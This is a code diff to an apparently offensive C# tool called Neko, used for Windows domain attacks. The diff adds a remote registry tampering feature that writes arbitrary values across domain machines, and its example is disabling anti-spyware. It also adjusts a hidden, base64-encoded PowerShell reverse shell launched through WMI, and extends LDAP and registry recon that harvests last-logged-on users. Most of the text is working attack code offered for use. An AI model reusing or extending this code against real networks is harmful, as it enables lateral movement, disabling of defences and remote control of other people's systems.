@@ -153,7 +153,8 @@ namespace Recon
             {
 
                 //Prompt user decision on recon or deployment via WMI
-                Console.WriteLine("\r\nOptions: \r\n\r\n 1: Recon \r\n\r\n 2: Installation from C2 via WMI + PowerShell \r\n\r\n 3: Deployment via WMI \r\n\r\n 4: Command and Control \r\n");
+                Console.WriteLine("\r\nOptions: \r\n\r\n 1: Recon \r\n\r\n 2: Installation from C2 via WMI + PowerShell \r\n\r\n 3: Deployment via WMI \r\n\r\n 4: Command and Control \r\n" +
+                    "\r\n\r\n 5: Remote Registry Tampering");
                 Console.WriteLine("Make your selection:");
                 string attackType = Console.ReadLine();
                 while (attackType != "1" && attackType != "2" && attackType != "3" && attackType != "4")
@@ -178,7 +179,7 @@ namespace Recon
                 Console.WriteLine("\r\nResults will be written to " + nekoFolder);
 
 
-
+                //Recon options
                 if (attackType == "1")
                 {
                     Console.WriteLine("\r\nRecon options: \r\n\r\n 1: Local machine \r\n\r\n 2: Domain via LDAP \r\n\r\n 3: Network Scan with Option of WMI" +
@@ -191,6 +192,7 @@ namespace Recon
                         reconChoice = Console.ReadLine();
                     }
 
+                    //Local machine recon
                     if (reconChoice == "1")
                     {
                         Console.WriteLine("\r\n" +
@@ -205,6 +207,7 @@ namespace Recon
                         //Conduct local recon
                         LocalMachine(nekoFolder);
                     }
+                    //Domain recon via LDAP
                     else if (reconChoice == "2")
                     {
 
@@ -286,6 +289,7 @@ namespace Recon
 
                             try
                             {
+                                //Create list of computers
                                 var computerList = Neko.ADComputer.GetADComputers(domainURL, Username, Password);
                                 Console.WriteLine("\r\nFound computers:");
 
@@ -319,6 +323,7 @@ namespace Recon
 
                         }
                     }
+                    //Network IP recon with option of WMI
                     else if (reconChoice == "3")
                     {
                         //Get type of scan
@@ -449,7 +454,7 @@ namespace Recon
                     }
                     else if(reconChoice == "4")
                     {
-                        RemoteRegQuery(nekoFolder);
+                        RemoteRegQuery(nekoFolder, domainURL, Username, Password);
                     }
                 }
                 //Installation of payload via PowerShell + WMI with obfuscation options
@@ -635,7 +640,7 @@ namespace Recon
                     }
                 }
                 //C2 via Reverse TCP Shell
-                if (attackType == "4")
+                else if (attackType == "4")
                 {
                     //Confirm that user wants to launch reverse shell
                     Console.WriteLine("\r\n" +
@@ -685,9 +690,14 @@ namespace Recon
                         byte[] encoded = Encoding.Unicode.GetBytes(reverseShell);
                         string obfuscatedCommand = Convert.ToBase64String(encoded);
 
-                        string commandLine = "cmd.exe /k powershell -windowstyle hidden -noprofile -noninteractive -encodedcommand " + obfuscatedCommand;
+                        string commandLine = "cmd.exe /c powershell -windowstyle hidden -noprofile -noninteractive -encodedcommand " + obfuscatedCommand;
                         AttackWMI(Username, Password, domainURL, targetIP, commandLine);
                     }
+                }
+                //Remote registry tampering
+                else if(attackType == "5")
+                {
+                    RemoteRegModification(nekoFolder, domainURL, Username, Password);
                 }
 
                 //See if user wants to go back to main menu or exit
@@ -714,23 +724,23 @@ namespace Recon
 
         }
 
-        //Method for converting SID to username
-        public static string SidConversion(string sid)
-        {
-            string account = new SecurityIdentifier(sid).Translate(typeof(NTAccount)).ToString();
+        ////Method for converting SID to username
+        //public static string SidConversion(string sid)
+        //{
+        //    string account = new SecurityIdentifier(sid).Translate(typeof(NTAccount)).ToString();
 
-            return account;
-        }
+        //    return account;
+        //}
 
-        /// Method for remote registry query - need to make this so user can input their own options
-        public static void RemoteRegQuery(string nekoFolder)
+        /// Method for remote registry query for logged on users - need to make this so user can input their own options
+        public static void RemoteRegQuery(string nekoFolder, string domainURL, string Username, string Password)
         {
             //Confirm that user has appropriate creds and is able to query registry remotely. 
             Console.WriteLine("This process typically requires domain admin privileges and remote registry enabled. Conintue? Enter 'y' or 'n':");
             string userDecision = Console.ReadLine();
             while(userDecision != "y" && userDecision != "")
             {
-                Console.WriteLine("Invalid Selection. \r\nThis process typically requires domain admin privileges and remote registry enabled. Conintue? Enter 'y' or 'n':");
+                Console.WriteLine("Invalid Selection.\r\nThis process typically requires domain admin privileges and remote registry enabled. Conintue? Enter 'y' or 'n':");
             }
             if(userDecision == "y")
             {
@@ -740,50 +750,414 @@ namespace Recon
                 userDecision = Console.ReadLine();
                 while (userDecision != "1" && userDecision != "2")
                 {
-                    Console.WriteLine("Invalid selection. Enter '1' to use results from LDAP recon or '2' to specify target computer name:");
+                    Console.WriteLine("Invalid selection.\r\nEnter '1' to use results from LDAP recon or '2' to specify target computer name:");
                 }
-                //Declare computer name
-                string computerName = "";
 
                 if(userDecision == "2")
                 {
+
+                    //Declare computer name
+                    string computerName = "";
                     //Get computer name
                     Console.WriteLine("Specify target computer name:");
                     computerName = Console.ReadLine();
-                }
-                //else - Updating later
-                //{
-                //    //ComputerName from list
-                //}
 
-                //Open remote key
-                try
-                {
-                    //Specifiy key
-                    RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, computerName, RegistryView.Registry64);
-
-                    var key = registryKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI");
-                    if (key == null)
+                    //Open remote key
+                    try
                     {
+                        //Specifiy key
+                        RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, computerName, RegistryView.Registry64);
+
+                        var key = registryKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI");
+                        if (key == null)
+                        {
+
+                        }
+                        //Create objects for values
+                        object lastUser = key.GetValue("LastLoggedOnUser");
+                        object lastDisplayName = key.GetValue("LastLoggedOnDisplayName");
+
+                        //Display information
+                        Console.WriteLine(lastUser.ToString(), lastDisplayName.ToString());
+
+                        //Write out results
+                        File.AppendAllText(nekoFolder + "\\User Locations.txt", "Last user: " + lastUser.ToString() + Environment.NewLine + "Display Name: " + lastDisplayName.ToString() + Environment.NewLine
+                            + "Computer Name: " + computerName + Environment.NewLine);
+
 
                     }
-                    //Create objects for values
-                    object lastUser = key.GetValue("LastLoggedOnUser");
-                    object lastDisplayName = key.GetValue("LastLoggedOnDisplayName");
-
-                    //Display information
-                    Console.WriteLine(lastUser.ToString(), lastDisplayName.ToString());
-
-                    //Write out results
-                    File.AppendAllText(nekoFolder + "\\User Locations.txt", "Last user: " + lastUser.ToString() + Environment.NewLine + "Display Name: " + lastDisplayName.ToString() + Environment.NewLine
-                        + "Computer Name: " + computerName + Environment.NewLine);
-
-
+                    catch (UnauthorizedAccessException e)
+                    {
+                        Console.WriteLine("Access Denied. Insuficient privileges.");
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                    }
                 }
-                catch (Exception e)
+                else
                 {
-                    Console.WriteLine(e);
+                    //ComputerName from list
+                    //Access list class from LDAP recon, need to make this so user can specify their own list if they want.
+                    Console.WriteLine("Have you run LDAP recon to generate machine name list? Enter 'y' or 'n'");
+                    string userChoice = Console.ReadLine();
+                    while(userChoice != "y" && userChoice != "n")
+                    {
+                        Console.WriteLine("Invalid selection. Have you run LDAP computer recon to generate machine name list? Enter 'y' or 'n'");
+                        //Set input
+                        userChoice = Console.ReadLine();
+                    }
+                    //Run ldap comnputer recon
+                    if(userChoice == "n")
+                    {
+                        try
+                        {
+                            var computerList = Neko.ADComputer.GetADComputers(domainURL, Username, Password);
+                            Console.WriteLine("\r\nFound computers:");
+
+                            //Get unique file to prevent overwriting
+                            string writePath = UniqueFile(nekoFolder + "\\LDAP Computer Recon.txt");
+
+                            //Start stream writer for writing results
+                            using (var writer = new StreamWriter(writePath, append: true))
+                            {
+                                foreach (var computer in computerList)
+                                {
+                                    Console.WriteLine(computer.ComputerInfo);
+                                    Console.WriteLine(computer.LastLogon);
+                                    Console.WriteLine(computer.ComputerType);
+
+                                    //Write out results
+                                    writer.WriteLine(Environment.NewLine + "Computer Name: " + computer.ComputerInfo + Environment.NewLine + "Last Logon: " + computer.LastLogon
+                                        + Environment.NewLine + "Computer type " + computer.ComputerType);
+                                    writer.Flush();
+
+                                }
+                            }
+
+
+
+                        }
+
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e);
+                        }
+                    }
+                    //Run remote registry recon for all machines in list. 
+                    else
+                    {
+                        var computerList = Neko.ADComputer.GetADComputers(domainURL, Username, Password);
+
+                        foreach (var computerName in computerList)
+                        {
+                            //Open remote key
+                            try
+                            {
+                                //Specifiy key
+                                RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, computerName.ComputerInfo, RegistryView.Registry64);
+
+                                var key = registryKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI");
+                                if (key == null)
+                                {
+
+                                }
+                                //Create objects for values
+                                object lastUser = key.GetValue("LastLoggedOnUser");
+                                object lastDisplayName = key.GetValue("LastLoggedOnDisplayName");
+
+                                //Display information
+                                Console.WriteLine(lastUser.ToString(), lastDisplayName.ToString());
+
+                                //Write out results
+                                File.AppendAllText(nekoFolder + "\\User Locations.txt", "Last user: " + lastUser.ToString() + Environment.NewLine + "Display Name: " + lastDisplayName.ToString() + Environment.NewLine
+                                    + "Computer Name: " + computerName + Environment.NewLine);
+
+
+                            }
+
+                            catch (Exception e)
+                            {
+                                Console.WriteLine(e);
+                            }
+                        }
+                    }
+
                 }
+
+            }
+
+        }
+
+        //Method for remote registry tampering
+        public static void RemoteRegModification(string nekoFolder, string domainURL, string Username, string Password)
+        {
+            //Confirm that user has appropriate creds and is able to query registry remotely. 
+            Console.WriteLine("This process typically requires domain admin privileges and remote registry enabled. Conintue? Enter 'y' or 'n':");
+            string userDecision = Console.ReadLine();
+            while (userDecision != "y" && userDecision != "")
+            {
+                Console.WriteLine("Invalid Selection.\r\nThis process typically requires domain admin privileges and remote registry enabled. Conintue? Enter 'y' or 'n':");
+            }
+            if (userDecision == "y")
+            {
+
+                //Need to turn this into list from previous results
+                Console.WriteLine("Enter '1' to use results from LDAP recon or '2' to specify target computer name:");
+                userDecision = Console.ReadLine();
+                while (userDecision != "1" && userDecision != "2")
+                {
+                    Console.WriteLine("Invalid selection.\r\nEnter '1' to use results from LDAP recon or '2' to specify target computer name:");
+                    userDecision = Console.ReadLine();
+                }
+
+                if (userDecision == "2")
+                {
+
+                    //Declare computer name
+                    string computerName = "";
+                    //Get computer name
+                    Console.WriteLine("Specify target computer name:");
+                    computerName = Console.ReadLine();
+
+                    //Get Hive name
+                    Console.WriteLine("Specify hive:" +
+                        "\r\n\r\n1: Local Machine" +
+                        "\r\n\r\n2: Current User" +
+                        "\r\n\r\n3: Users" +
+                        "\r\n\r\n4: Classes Root");
+                    string userChoice = Console.ReadLine();
+                    //Loop to confirm correct input
+                    while(userChoice != "1" && userChoice != "2" && userChoice != "3" && userChoice != "4")
+                    {
+                        Console.WriteLine("Invalid selection" +
+                            "\r\n\r\nSpecify hive:" +
+                        "\r\n\r\n1: LocalMachine" +
+                        "\r\n\r\n2: CurrentUser" +
+                        "\r\n\r\n3: Users" +
+                        "\r\n\r\n4: ClassesRoot");
+                    }
+
+                    //Declare registryhive
+                    RegistryHive registryHive = RegistryHive.LocalMachine;
+                    if (userChoice == "1")
+                    {
+                     //Do nothing since it was set to default of LocalMachine   
+                    }
+                    //Set as CurrentUser hive
+                    else if (userChoice == "2")
+                    {
+                        registryHive = RegistryHive.CurrentUser;
+                    }
+                    //Set as Users hive
+                    else if(userChoice == "3")
+                    {
+                        registryHive = RegistryHive.Users;
+                    }
+                    //Set as ClassesRoot hive
+                    else if(userChoice == "4")
+                    {
+                        registryHive = RegistryHive.ClassesRoot;
+                    }
+
+                    //Specify reg name
+                    Console.WriteLine("Specify registry Name, e.g. 'DisableAntiSpyware':");
+                    string name = Console.ReadLine();
+
+                    //Get key choice
+                    Console.WriteLine(@"Specify registry key, e.g. 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authenication\LogonUI':");
+                    string regKey = @Console.ReadLine();
+
+                    //Choose new value
+                    Console.WriteLine("Specify new registry value, e.g. '0':");
+                    string newValue = Console.ReadLine();
+
+                    //Open remote key
+                    try
+                    {
+                        //Open key
+                        RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(registryHive, computerName, RegistryView.Registry64);
+
+                        //open subkey
+                        var key = registryKey.OpenSubKey(regKey);
+                        if (key == null)
+                        {
+
+                        }
+                        //Create objects for values
+                        key.SetValue(name, newValue);
+
+                        //Check that value was modified
+                        object regValue = key.GetValue(name);
+
+                        //Display information
+                        Console.WriteLine(regValue.ToString());
+
+                        //Write out results
+                        File.AppendAllText(nekoFolder + "\\Registry modifications.txt", name + regValue.ToString() + Environment.NewLine + Environment.NewLine
+                            + "Computer Name: " + computerName + Environment.NewLine);
+
+
+                    }
+                    catch (UnauthorizedAccessException e)
+                    {
+                        Console.WriteLine("Access Denied. Insuficient privileges.");
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                    }
+                }
+                else
+                {
+                    //ComputerName from list
+                    //Access list class from LDAP recon, need to make this so user can specify their own list if they want.
+                    Console.WriteLine("Have you run LDAP recon to generate machine name list? Enter 'y' or 'n'");
+                    string userChoice = Console.ReadLine();
+                    while (userChoice != "y" && userChoice != "n")
+                    {
+                        Console.WriteLine("Invalid selection. Have you run LDAP computer recon to generate machine name list? Enter 'y' or 'n'");
+                    }
+                    //Run ldap comnputer recon
+                    if (userChoice == "n")
+                    {
+                        try
+                        {
+                            var computerList = Neko.ADComputer.GetADComputers(domainURL, Username, Password);
+                            Console.WriteLine("\r\nFound computers:");
+
+                            //Get unique file to prevent overwriting
+                            string writePath = UniqueFile(nekoFolder + "\\LDAP Computer Recon.txt");
+
+                            //Start stream writer for writing results
+                            using (var writer = new StreamWriter(writePath, append: true))
+                            {
+                                foreach (var computer in computerList)
+                                {
+                                    Console.WriteLine(computer.ComputerInfo);
+                                    Console.WriteLine(computer.LastLogon);
+                                    Console.WriteLine(computer.ComputerType);
+
+                                    //Write out results
+                                    writer.WriteLine(Environment.NewLine + "Computer Name: " + computer.ComputerInfo + Environment.NewLine + "Last Logon: " + computer.LastLogon
+                                        + Environment.NewLine + "Computer type " + computer.ComputerType);
+                                    writer.Flush();
+
+                                }
+                            }
+
+
+
+                        }
+                        catch (UnauthorizedAccessException e)
+                        {
+                            Console.WriteLine("Access Denied. Insuficient privileges.");
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e);
+                        }
+                    }
+                    //Run remote registry recon for all machines in list. 
+                    else
+                    {
+                        var computerList = Neko.ADComputer.GetADComputers(domainURL, Username, Password);
+
+                        foreach (var computerName in computerList)
+                        {
+
+                            //Get Hive name
+                            Console.WriteLine("Specify hive:" +
+                                "\r\n\r\n1: Local Machine" +
+                                "\r\n\r\n2: Current User" +
+                                "\r\n\r\n3: Users" +
+                                "\r\n\r\n4: Classes Root");
+                            userChoice = Console.ReadLine();
+                            //Loop to confirm correct input
+                            while (userChoice != "1" && userChoice != "2" && userChoice != "3" && userChoice != "4")
+                            {
+                                Console.WriteLine("Invalid selection" +
+                                    "\r\n\r\nSpecify hive:" +
+                                "\r\n\r\n1: LocalMachine" +
+                                "\r\n\r\n2: CurrentUser" +
+                                "\r\n\r\n3: Users" +
+                                "\r\n\r\n4: ClassesRoot");
+                            }
+
+                            //Declare registryhive
+                            RegistryHive registryHive = RegistryHive.LocalMachine;
+                            if (userChoice == "1")
+                            {
+                                //Do nothing since it was set to default of LocalMachine   
+                            }
+                            //Set as CurrentUser hive
+                            else if (userChoice == "2")
+                            {
+                                registryHive = RegistryHive.CurrentUser;
+                            }
+                            //Set as Users hive
+                            else if (userChoice == "3")
+                            {
+                                registryHive = RegistryHive.Users;
+                            }
+                            //Set as ClassesRoot hive
+                            else if (userChoice == "4")
+                            {
+                                registryHive = RegistryHive.ClassesRoot;
+                            }
+
+                            //Specify reg name
+                            Console.WriteLine("Specify registry Name, e.g. 'DisableAntiSpyware':");
+                            string name = Console.ReadLine();
+
+                            //Get key choice
+                            Console.WriteLine(@"Specify registry key, e.g. 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authenication\LogonUI':");
+                            string regKey = @Console.ReadLine();
+
+                            //Choose new value
+                            Console.WriteLine("Specify new registry value, e.g. '0':");
+                            string newValue = Console.ReadLine();
+
+                            //Open remote key
+                            try
+                            {
+                                //Open key
+                                RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(registryHive, computerName.ComputerInfo, RegistryView.Registry64);
+
+                                //open subkey
+                                var key = registryKey.OpenSubKey(regKey);
+                                if (key == null)
+                                {
+
+                                }
+                                //Create objects for values
+                                key.SetValue(name, newValue);
+
+                                //Check that value was modified
+                                object regValue = key.GetValue(name);
+
+                                //Display information
+                                Console.WriteLine(regValue.ToString());
+
+                                //Write out results
+                                File.AppendAllText(nekoFolder + "\\Registry modifications.txt", name + regValue.ToString() + Environment.NewLine + Environment.NewLine
+                                    + "Computer Name: " + computerName + Environment.NewLine);
+
+
+                            }
+                            catch (UnauthorizedAccessException e)
+                            {
+                                Console.WriteLine("Access Denied. Insuficient privileges.");
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine(e);
+                            }
+                        }
+                    }
+
+                }
+
             }
 
 
@@ -913,7 +1287,6 @@ namespace Recon
                 cmdArgs[2] = "/c netstat -ano | find /i \"listening\"";
                 cmdArgs[3] = "/c ipconfig /all";
                 cmdArgs[4] = "/c tasklist";
-                //cmdArgs[3] = "/c sc query";
 
 
                 //Get unique name
@@ -1422,8 +1795,10 @@ namespace Recon
             // WMI Scan
             if (type == "1")
             {
+                //Go through all IPs
                 for (int i = startIp; i < stopIp; i++)
                 {
+                    //And loop through each port
                     for (int j = portStart; j < portStop; j++)
                     {
                         string results = "";
@@ -1465,9 +1840,10 @@ namespace Recon
             //Network only
             else if (type == "2")
             {
-
+                //Loop through IPs
                 for (int i = startIp; i < stopIp; i++)
                 {
+                    //Loop through ports
                     for (int j = portStart; j < portStop; j++)
                     {
                         string results = "";
@@ -1528,6 +1904,7 @@ namespace Recon
                     //Run scan
                     foreach (var portNumber in fullList)
                     {
+                        //Go through all 255 IPs of last octet
                         for (int i = 1; i < 256; i++)
                         {
                             try
@@ -1586,6 +1963,7 @@ namespace Recon
                     //Run scan
                     foreach (var portNumber in fullList)
                     {
+                        //Go through each IP
                         for (int i = 1; i < 256; i++)
                         {
                             try
